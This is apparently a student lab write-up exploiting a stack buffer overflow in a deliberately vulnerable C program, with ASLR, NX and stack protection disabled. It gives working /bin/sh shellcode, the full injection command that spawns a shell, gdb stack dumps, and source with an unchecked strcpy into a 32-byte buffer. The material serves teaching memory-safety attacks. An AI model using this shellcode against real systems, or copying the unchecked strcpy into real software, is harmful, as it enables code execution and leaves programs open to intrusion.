# Lab3 - Buffer overflow attack(turn off ASLR, turn off NX)

## Overview
This example shows how to find the return address location of strcpy using buffer overflow.
After finding out where it is, overwrite the return address with a address where we want to jump(What if the jump address is a program getting a shell!!)

## PAYLOAD
Payload = Aligned Shellcode + Safe padding + BUFFER_START_ADDRESS
 
## Steps
1. Set an address you want to jump. In this example, we just want to find out the address where the program exit immediately. Later on, this address will be the address you want to execute!!
2. Find where the strcpy return address is.(It's a brute force method)
3. And then, run the c program with a parameter containing the address where you want to jump.(We are going to use the address from the Step1)
4. Make a payload which include the execution of shell code!!
5. Place the payload as a parameter of the 'ans_check5'.

## Before get started
+ Preparation. Compile the c program below like this. 
```
gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5
```
+ gcc option explanation
```
-g : default debug information
-z execstack : marks the stack as executable
-fno-stack-protector : disables stack protection
-o : set output file name
```

## Step1. Find a exit function in the program
+ In a program, there should be a exit function naturally. We will use this address for later use.
+ Execute below to find out the address we want to jump. As you can see, 0x080485b3 is the address we want to jump!
```
[02/09/22]seed@VM:Byeongchan$ objdump -D ans_check5 | grep -B 1 exit

08048400 <exit@plt>:
--
 80485b3:	6a 00                	push   $0x0
 80485b5:	e8 46 fe ff ff       	call   8048400 <exit@plt>
[02/09/22]seed@VM:Byeongchan$
```

## Step2. Find out where the return address of strcpy function is! 
+ This is where brute force method comes in! Try like below changing the number of print count. 
+ If the program ended without printing 'About to exit!', that means return address was corrupted and the program was killed by the system.
```
[02/09/22]seed@VM:Byeongchan$ ./ans_check5 $(python -c "print '0'*47")
ans_buf is at address 0xbf88027c
Right answer!
About to exit!
Segmentation fault
[02/09/22]seed@VM:Byeongchan$ ./ans_check5 $(python -c "print '0'*48")
ans_buf is at address 0xbf8fe32c
Segmentation fault

```

## Step3. Exit without any other segmentation fault!
+ Python code will create meaning-less characters followed by exit return address. 
+ That return address will overwrite the return address of strcpy. If the program exit without 'Segmentation fault', then you found the right place!!!
+ Think about it. What if we can overwrite return address to a target program address we want to execute?
```
ans_check5 $( python -c "print '\xAA'*48 + '\xb3\x85\x04\x08'") 
```

+ Result. 
   + As you can notice, the program exit with special input parameter overwriting the return address 
```
[02/10/22]seed@VM:Byeongchan$ ans_check5
Usage: ans_check5 <answer>
[02/10/22]seed@VM:Byeongchan$ ans_check5 1
ans_buf is at address 0xbf8d9acc
Wrong answer!
About to exit!
[02/10/22]seed@VM:Byeongchan$ ans_check5 forty-two
ans_buf is at address 0xbfb8ad9c
Right answer!
About to exit!
[02/10/22]seed@VM:Byeongchan$ ans_check5 $( python -c "print '\xAA'*48 + '\xb3\x85\x04\x08'") 
ans_buf is at address 0xbf97bbdc
[02/10/22]seed@VM:Byeongchan$ 
```

## Step4. Make a payload. 
  + PAYLOAD = <Aligned Shellcode> + <Safe padding>+<BUFFER_START_ADDRESS>
  + Shellcode: It's a execution of /bin/sh and hexacoded.
  + Safe padding: Need it to reach the return address location
  + BUFFER_START_ADDRESS: Address of a target program. In this case, the start address of 'Aligned Shellcode'
  + In this practice, we turn off ASLR so we surely know where it the start address of our overwrite.
```
Shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
Safe padding: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
BUFFER_START_ADDRESS: \x6c\xfd\xff\xbf
```

## Step5. Place the payload as a parameter of the 'ans_check5'.

  + FIRST, I executed on command line and I got another bash shell!!!!
  + SECOND, using gdb, investigate the content of the stack!!
  + I can see the corrupted stack content filled with the malicious code and \x90s and return address which points to the malicious code!!
```
[02/10/22]seed@VM:Byeongchan$ env -i PWD="/home/seed/stack_addresses" SHELL="/bin/bash" SHLVL=0 /home/seed/stack_addresses/ans_check5 $( python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x90'*24 + '\x6c\xfd\xff\xbf'")
ans_buf is at address 0xbffffd6c
$ exit
[02/10/22]seed@VM:Byeongchan$
```
```
(gdb) x/32xw $esp
0xbffffd50:	0xbffffd6c	0xbfffff6a	0xbffffd70	0x080482c7
0xbffffd60:	0x00000000	0xbffffe04	0xb7fba000	0xb7eeed57
0xbffffd70:	0xffffffff	0x0000002f	0xb7e14dc8	0xb7fd6858
0xbffffd80:	0x00000001	0x00008000	0xb7fba000	0x00000000
0xbffffd90:	0x00000002	0x00800000	0xbffffdb8	0x080485cb
0xbffffda0:	0xbfffff6a	0xbffffe64	0xbffffe70	0x08048651
0xbffffdb0:	0xb7fba3dc	0xbffffdd0	0x00000000	0xb7e20637
0xbffffdc0:	0xb7fba000	0xb7fba000	0x00000000	0xb7e20637
(gdb) c
Continuing.

Breakpoint 2, 0x0804855b in check_answer (ans=0xbfffff00 "\031")
    at ans_check5.c:12
12	  strcpy(ans_buf, ans);
(gdb) x/32xw $esp
0xbffffd50:	0xbffffd6c	0xbfffff6a	0xbffffd70	0x080482c7
0xbffffd60:	0x00000000	0xbffffe04	0xb7fba000	0x6850c031
0xbffffd70:	0x68732f2f	0x69622f68	0x50e3896e	0x99e18953
0xbffffd80:	0x80cd0bb0	0x90909090	0x90909090	0x90909090
0xbffffd90:	0x90909090	0x90909090	0x90909090	0xbffffd6c
0xbffffda0:	0xbfffff00	0xbffffe64	0xbffffe70	0x08048651
0xbffffdb0:	0xb7fba3dc	0xbffffdd0	0x00000000	0xb7e20637
0xbffffdc0:	0xb7fba000	0xb7fba000	0x00000000	0xb7e20637
(gdb)
```

## ans_check5.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_answer(char *ans) {

  int ans_flag = 0;
  char ans_buf[32];

  printf("ans_buf is at address %p\n", &ans_buf);

  strcpy(ans_buf, ans);

  if (strcmp(ans_buf, "forty-two") == 0)
    ans_flag = 1;

  return ans_flag;

}

int main(int argc, char *argv[]) {

  if (argc < 2) {
    printf("Usage: %s <answer>\n", argv[0]);
    exit(0);
  }
  if (check_answer(argv[1])) {
    printf("Right answer!\n");
  } else {
    printf("Wrong answer!\n");
  }
  printf("About to exit!\n");
  fflush(stdout);
}
```


